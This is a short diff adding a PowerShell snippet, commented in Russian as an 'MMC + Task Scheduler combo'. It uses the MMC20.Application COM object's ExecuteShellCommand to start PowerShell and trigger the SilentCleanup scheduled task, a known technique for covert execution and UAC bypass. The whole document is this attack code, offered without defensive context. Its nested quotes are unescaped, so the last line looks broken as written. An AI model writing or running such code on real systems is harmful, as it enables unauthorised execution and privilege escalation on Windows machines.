@@ -1,0 +1,3 @@
+# MMC + Task Scheduler комбо
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application"))
+$com.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, "-c "schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"", "0")
